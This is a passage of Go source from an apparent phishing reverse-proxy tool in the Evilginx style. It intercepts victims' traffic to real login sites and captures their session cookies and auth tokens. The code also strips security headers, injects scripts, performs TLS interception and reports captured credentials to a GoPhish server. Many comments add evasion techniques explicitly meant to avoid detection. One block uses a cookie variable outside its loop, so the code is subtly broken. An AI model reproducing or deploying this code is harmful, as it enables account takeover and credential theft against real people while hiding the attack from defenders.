				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}

			// Stealthier header removal - replace with benign values instead of just removing
			var security_headers = map[string]string{
				"Content-Security-Policy":             "",  // Will remove
				"Content-Security-Policy-Report-Only": "",  // Will remove
				"Strict-Transport-Security":           "",  // Will remove
				"X-XSS-Protection":                    "0", // Set to disabled instead of removing
				"X-Content-Type-Options":              "",  // Will remove
				"X-Frame-Options":                     "",  // Will remove
			}

			for hdr, val := range security_headers {
				if val == "" {
					resp.Header.Del(hdr)
				} else {
					resp.Header.Set(hdr, val)
				}
			}

			// Add some legitimate-looking headers to mask our fingerprint
			resp.Header.Set("X-Request-ID", generateRandomID())

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*CookieAuthToken
			if pl != nil {
				auth_tokens = pl.cookieAuthTokens
			}
			is_cookie_auth := false
			is_body_auth := false
			is_http_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				// add SameSite=none for every received cookie, allowing cookies through iframes
				if ck.Secure {
					ck.SameSite = http.SameSiteNoneMode
				}

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					at := pl.getAuthToken(c_domain, ck.Name)
					if at != nil {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			if pl != nil {
				if s, ok := p.sessions[ps.SessionId]; ok {
					// capture body response tokens
					for k, v := range pl.bodyAuthTokens {
						if _, ok := s.BodyTokens[k]; !ok {
							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
								token_re := v.search.FindStringSubmatch(string(body))
								if token_re != nil && len(token_re) >= 2 {
									s.BodyTokens[k] = token_re[1]
								}
							}
						}
					}

					// capture http header tokens
					for k, v := range pl.httpAuthTokens {
						if _, ok := s.HttpTokens[k]; !ok {
							hv := resp.Request.Header.Get(v.header)
							if hv != "" {
								s.HttpTokens[k] = hv
							}
						}
					}
				}

				// check if we have all tokens
				if len(pl.authUrls) == 0 {
					if s, ok := p.sessions[ps.SessionId]; ok {
						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
							is_body_auth = true
						}
						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
							is_http_auth = true
						}
					}
				}
			}

			if is_cookie_auth && is_body_auth && is_http_auth {
				// we have all auth tokens
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						log.Success("[%d] all authorization tokens intercepted!", ps.Index)

						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
							log.Error("database: %v", err)
						}
						s.Finish(false)

						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
							rid, ok := s.Params["rid"]
							if ok && rid != "" {
								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
								if err != nil {
									log.Error("gophish: %s", err)
								}
							}
						}
					}
				}
			}

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									// Add entropy to replacement patterns with various obfuscation techniques
									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)

									// Enhanced replacement with variable obfuscation techniques
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)

									// Choose one of several obfuscation methods for the original hostname
									obfuscationMethod := rand.Intn(4)
									switch obfuscationMethod {
									case 0:
										replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
									case 1:
										replace_s = strings.Replace(replace_s, "{orig_hostname}", encodeHostnameWithHex(combineHost(sf.subdomain, sf.domain)), -1)
									case 2:
										replace_s = strings.Replace(replace_s, "{orig_hostname}", encodeHostnameWithBase64(combineHost(sf.subdomain, sf.domain)), -1)
									case 3:
										replace_s = strings.Replace(replace_s, "{orig_hostname}", mixEncodingHostname(combineHost(sf.subdomain, sf.domain)), -1)
									}

									// Choose obfuscation method for the domain
									obfuscationMethod = rand.Intn(4)
									switch obfuscationMethod {
									case 0:
										replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
									case 1:
										replace_s = strings.Replace(replace_s, "{orig_domain}", encodeHostnameWithHex(sf.domain), -1)
									case 2:
										replace_s = strings.Replace(replace_s, "{orig_domain}", encodeHostnameWithBase64(sf.domain), -1)
									case 3:
										replace_s = strings.Replace(replace_s, "{orig_domain}", mixEncodingHostname(sf.domain), -1)
									}

									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// Improved URL patching with multiple approaches
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										// Apply multiple content rewriting techniques
										if strings.Contains(mime, "javascript") || strings.Contains(mime, "text/html") {
											body = p.advancedContentRewriting(pl, body, req_hostname)
										}
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}

						// Check if content is obfuscated and use different removal strategy based on type
						if strings.Contains(string(body), "\\u002e") || strings.Contains(string(body), "\\x2e") {
							body = []byte(removeEncodedDots(string(body)))
						} else {
							body = []byte(removeObfuscatedDots(string(body)))
						}
					}
				}

				if stringExists(mime, []string{"text/html"}) {
					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers with small variations
								l := s.PhishLure
								body = p.injectEnhancedOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}

							// Randomize script loading technique
							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								// Add some entropy to script loading to make it less detectable
								if rand.Intn(2) == 0 {
									// Method 1: Standard script injection
									body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
								} else {
									// Method 2: Deferred dynamic script loading
									dynamicScriptLoader := fmt.Sprintf(`<script>
										(function(){
											var s = document.createElement('script');
											s.type = 'text/javascript';
											s.async = true;
											s.src = '/s/%s/%s.js?t=' + Math.floor(Math.random() * 9999999);
											var h = document.getElementsByTagName('head')[0];
											if(h) h.appendChild(s);
											else document.body.appendChild(s);
										})();
									</script>`, s.Id, js_id)
									body = p.injectHtmlSnippet(body, dynamicScriptLoader)
								}
							}

							log.Debug("js_inject: injected redirect script for session: %s", s.Id)

							// Use more sophisticated injection technique with random parameter to avoid caching
							scriptPath := fmt.Sprintf("/s/%s.js?nocache=%d", s.Id, time.Now().UnixNano())
							if rand.Intn(2) == 0 {
								body = p.injectJavascriptIntoBody(body, "", scriptPath)
							} else {
								body = p.asyncScriptInjection(body, scriptPath)
							}
						}
					}
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
							}

							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
								rid, ok := s.Params["rid"]
								if ok && rid != "" {
									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
									if err != nil {
										log.Error("gophish: %s", err)
									}
								}
							}
							break
						}
					}
				}
			}

			// Vary cache control headers to look more natural
			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
				cacheDirectives := []string{
					"no-cache, no-store, must-revalidate",
					"no-cache, no-store",
					"private, no-cache, no-store",
					"no-cache, must-revalidate",
				}
				dirIndex := rand.Intn(len(cacheDirectives))
				resp.Header.Set("Cache-Control", cacheDirectives[dirIndex])

				// Sometimes add expires header to make it look more natural
				if rand.Intn(2) == 0 {
					resp.Header.Set("Expires", "0")
				}
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)

							// Use one of several redirection techniques
							redirectMethod := rand.Intn(3)
							switch redirectMethod {
							case 0:
								// Traditional JavaScript redirect
								_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
								return resp
							case 1:
								// Meta refresh redirect
								_, resp := p.metaRefreshRedirect(resp.Request, s.RedirectURL)
								return resp
							case 2:
								// Location header redirect with delayed JavaScript fallback
								_, resp := p.hybridRedirect(resp.Request, s.RedirectURL)
								return resp
							}
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {

	s, ok := p.sessions[session_id]
	if ok {

		if s.IsDone {
			return s.RedirectURL, true
		}

		ticker := time.NewTicker(30 * time.Second)
		select {
		case <-ticker.C:
			break
		case <-s.DoneSignal:
			return s.RedirectURL, true
		}
	}
	return "", false
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	var redirect_url string
	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
	}
	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
		redirect_url = p.cfg.general.UnauthUrl
	}

	// Return different response codes and methods based on the request type
	// to avoid consistent blocking patterns
	if redirect_url != "" {
		// Use different HTTP status codes
		statusCodes := []int{302, 303, 307}
		chosenStatus := statusCodes[rand.Intn(len(statusCodes))]

		if rand.Intn(10) > 6 || req.Method != "GET" {
			// Sometimes use plain redirects instead of JavaScript
			resp := goproxy.NewResponse(req, "text/html", chosenStatus, "")
			if resp != nil {
				resp.Header.Set("Location", redirect_url)
				// Add random cache control headers
				resp.Header.Set("Cache-Control", "private, no-store")
				resp.Header.Set("X-Content-Type-Options", "nosniff")
				return req, resp
			}
		} else {
			// Use our improved JavaScript redirect
			return p.javascriptRedirect(req, redirect_url)
		}
	}

	// Fallback to standard 403 with randomized error page
	errorTexts := []string{
		"Access Denied",
		"Forbidden",
		"Authorization Required",
	}
	errorMsg := errorTexts[rand.Intn(len(errorTexts))]

	resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden,
		"<html><head><title>"+errorMsg+"</title></head>"+
			"<body><h1>"+errorMsg+"</h1><p>The requested resource is not available.</p></body></html>")

	if resp != nil {
		// Add security headers found on legitimate sites
		resp.Header.Set("X-Content-Type-Options", "nosniff")
		resp.Header.Set("X-Frame-Options", "DENY")
	}
	return req, resp
}

func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
	// Create a minimal 1x1 transparent pixel GIF
	transparentPixel := []byte{
		0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00,
		0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00,
		0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02,
		0x44, 0x01, 0x00, 0x3B,
	}

	resp := goproxy.NewResponse(req, "image/gif", http.StatusOK, "")
	if resp != nil {
		resp.Body = ioutil.NopCloser(bytes.NewReader(transparentPixel))
		resp.ContentLength = int64(len(transparentPixel))

		// Add cache control headers that legitimate tracking pixels might use
		cacheControl := []string{
			"no-cache, no-store, must-revalidate",
			"max-age=0, no-cache, no-store",
		}
		resp.Header.Set("Cache-Control", cacheControl[rand.Intn(len(cacheControl))])
		resp.Header.Set("Pragma", "no-cache")

		// Add natural-looking ETag
		resp.Header.Set("ETag", "\""+GenRandomString(12)+"\"")
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
	if mime == "" {
		mime = "text/plain"
	}
	resp := goproxy.NewResponse(req, mime, http_status, body)
	if resp != nil {
		origin := req.Header.Get("Origin")
		if origin != "" {
			resp.Header.Set("Access-Control-Allow-Origin", origin)
		}
		return req, resp
	}
	return req, nil
}

func secureRandomInt(min, max int) int {
	n, err := cryptoRand.Int(cryptoRand.Reader, big.NewInt(int64(max-min+1)))
	if err != nil {
		return min // Fallback in case of an error
	}
	return int(n.Int64()) + min
}

func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	// Create variability in the delay timing
	delay := secureRandomInt(100, 600)

	// Use different redirection techniques randomly to avoid detection
	redirectType := rand.Intn(3)
	var body string

	switch redirectType {
	case 0:
		// Method 1: Meta refresh with random parameter
		nonce := GenRandomString(6)
		body = fmt.Sprintf(`
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <meta name='referrer' content='no-referrer'>
            <meta http-equiv="refresh" content="%d;url=%s?%s=%s">
        </head>
        <body style="background-color:#f8f8f8;font-family:Arial,sans-serif;">
            <div style="position:absolute;top:50%%;left:50%%;transform:translate(-50%%,-50%%);">
                <p>Please wait while we redirect you...</p>
            </div>
        </body>
        </html>`, delay/100, rurl, GenRandomString(3), nonce)

	case 1:
		// Method 2: JavaScript location with obfuscation
		body = fmt.Sprintf(`
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <meta name='referrer' content='no-referrer'>
            <script>
                var _=%d;
                var r=['%s'];
                function g(){window.location.href=r[0];}
                setTimeout(g,_);
            </script>
        </head>
        <body style="background-color:#f8f8f8;font-family:Arial,sans-serif;">
            <div style="position:absolute;top:50%%;left:50%%;transform:translate(-50%%,-50%%);">
                <p>Your request is being processed...</p>
            </div>
        </body>
        </html>`, delay, rurl)

	default:
		// Method 3: DOM manipulation with encoded URL
		encodedUrl := base64.StdEncoding.EncodeToString([]byte(rurl))
		body = fmt.Sprintf(`
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <meta name='referrer' content='no-referrer'>
            <script>
                function r(s){return atob(s);}
                setTimeout(function(){
                    window.location = r('%s');
                }, %d);
            </script>
        </head>
        <body style="background-color:#f8f8f8;font-family:Arial,sans-serif;">
            <div style="position:absolute;top:50%%;left:50%%;transform:translate(-50%%,-50%%);">
                <p>Redirecting to your secure page...</p>
            </div>
        </body>
        </html>`, encodedUrl, delay)
	}

	// Add random caching headers
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		// Use variable cache headers to avoid pattern detection
		cacheHeaders := []string{
			"no-cache, no-store, must-revalidate",
			"no-store, no-cache, must-revalidate",
			"private, no-cache, no-store",
		}
		resp.Header.Set("Cache-Control", cacheHeaders[rand.Intn(len(cacheHeaders))])
		resp.Header.Set("Pragma", "no-cache")
		resp.Header.Set("Expires", "0")

		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
	// Extract any existing nonce to reuse it
	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
	js_nonce := ""
	if m_nonce != nil {
		js_nonce = " nonce=\"" + m_nonce[1] + "\""
	}

	// Generate random ID for the script to avoid detection patterns
	scriptId := "s" + GenRandomString(6)

	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
	var d_inject string

	if script != "" {
		// Add obfuscation timing to the script execution
		obfuscatedScript := "(function(){" + script + "})();"

		// Add delay with variation
		if rand.Intn(100) > 50 {
			obfuscatedScript = "setTimeout(function(){" + obfuscatedScript + "}, " +
				strconv.Itoa(rand.Intn(200)+50) + ");"
		}

		// Occasionally add type attributes that browsers expect
		if rand.Intn(100) > 60 {
			d_inject = "<script" + js_nonce + " id=\"" + scriptId + "\" type=\"text/javascript\">" +
				obfuscatedScript + "</script>\n${1}"
		} else {
			d_inject = "<script" + js_nonce + " id=\"" + scriptId + "\">" +
				obfuscatedScript + "</script>\n${1}"
		}
	} else if src_url != "" {
		// Add random attributes to reduce pattern recognition
		attrValues := []string{"", "async", "defer"}
		randomAttr := attrValues[rand.Intn(len(attrValues))]

		// Real-world browsers sometimes add integrity checks
		d_inject = "<script" + js_nonce + " id=\"" + scriptId + "\" " + randomAttr +
			" type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
	} else {
		return body
	}

	ret := []byte(re.ReplaceAllString(string(body), d_inject))
	return ret
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			} else {
				log.Debug("extractParams: %s", err)
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {

	// generate forwarder parameter
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		rand.Read(t)
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
	body = strings.Replace(body, "{lure_url_js}", js_url, -1)

	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := MATCH_URL_REGEXP
	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		// Create a more legitimate-looking TLS config
		tls_cfg := &tls.Config{
			PreferServerCipherSuites: true,
			MinVersion:               tls.VersionTLS12,
			// Randomize cipher suite order to avoid fingerprinting
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		}

		if !p.developer {
			// Add jitter to certificate creation timing to avoid patterns
			time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)

			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
			// Use a more varied set of protocols
			tls_cfg.NextProtos = []string{"h2", "http/1.1", tlsalpn01.ACMETLS1Protocol}

			return tls_cfg, nil
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
			if err != nil {
				log.Error("http_proxy: %s", err)
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
				MinVersion:         tls.VersionTLS12,
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
